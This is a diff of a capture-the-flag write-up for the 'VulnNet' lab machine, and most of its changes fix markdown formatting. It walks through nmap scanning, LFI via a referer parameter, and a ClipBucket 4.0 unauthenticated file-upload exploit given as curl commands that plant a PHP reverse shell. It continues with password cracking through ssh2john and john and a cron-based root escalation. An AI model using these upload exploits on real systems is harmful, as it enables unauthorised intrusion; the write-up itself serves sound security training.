@@ -1,6 +1,6 @@
-##VulnNet
+## VulnNet
 
-#Enumeration
+# Enumeration
 add vulnnet.thm to /etc/hosts
 ```
 # Nmap 7.91 scan initiated Sun Apr 25 10:52:39 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,80 10.10.238.178
@@ -31,7 +31,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 Pretty simple configuration so far so lets just check out the web server
 
-#Web Server Port 80
+# Web Server Port 80
 Nothing stands out initially so ultimately we check out the js scripts on the page and ultimately find the following code
 "http://vulnnet.thm/index.php?referer="
 so looks like we have a paramter we can test for LFI,
@@ -76,8 +76,11 @@ We eventually find credentials for the webserver in /etc/apache2/.htpasswd
 
 However it seems like the credentials aren't applicable here. Eventually we do enumeration for subdomains and find one broadcast.vulnnet.thm that requires credentials and we gain access.
 
-#broadcast.vulnnet.thm
+# broadcast.vulnnet.thm
+```
 <!-- ClipBucket version 4.0 -->
+```
+
 we find the version of the application and can look up and existing exploits
 ```
 2. Unauthenticated Arbitrary File Upload
@@ -91,16 +94,17 @@ $ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
 "http://$HOST/actions/photo_uploader.php"
 ```
 seems like we can start by trying to upload a reverse shell and gain a foothold, so we can form the following curl request
-
+```
 curl -u developers:REDACTED -F "file=@revshell.php" -F "plupload=1" -F "name=revshell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
+```
 
 sure enough we get a revshell and foothold as the www-data user
 
-#Privilege Escalation
+# Privilege Escalation
 On the system we check the usual spots and can find backupcredentials in /var/backups that are owned by the server-management user and we can download to our system and view we find ssh credentials
 we go ahead and use ssh2john and then crack the password using john and can then ssh as the server-mangement user and find the user flag in our home directory
 
-#Root Escalation
+# Root Escalation
 We can't access sudo commands with the same crednetials so we check cronjobs, and see the following line
 ```
 */2   * * * *   root    /var/opt/backupsrv.sh
